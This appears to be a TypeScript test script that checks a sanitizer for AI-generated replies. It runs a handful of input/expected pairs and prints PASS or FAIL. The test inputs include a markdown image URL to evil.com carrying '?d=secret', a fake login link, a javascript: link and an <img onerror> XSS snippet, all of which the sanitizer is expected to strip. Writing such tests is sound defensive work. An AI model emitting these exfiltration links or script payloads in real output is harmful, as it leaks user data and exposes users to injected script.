import { sanitizeReply } from "../server/ai/sanitizeReply";

const cases: [string, string][] = [
  ["![x](https://evil.com/a.png?d=secret)", ""],
  ["[Watch](https://edkonnect.zoom.us/rec/share/abc)", "[Watch](https://edkonnect.zoom.us/rec/share/abc)"],
  ["[Click here](https://evil.com/login)", "Click here"],
  ["see https://evil.com/x now", "see [link removed] now"],
  ["[a](javascript:void)", "a"],
  ["<img src=x onerror=1>hi", "hi"],
  ["when x < 5 and y > 3", "when x < 5 and y > 3"],
];
let bad = 0;
for (const [input, expected] of cases) {
  const got = sanitizeReply(input);
  const ok = got === expected;
  if (!ok) bad++;
  console.log(ok ? "PASS" : "FAIL", JSON.stringify(input), "->", JSON.stringify(got));
}
console.log(bad === 0 ? "All good" : `${bad} failed`);
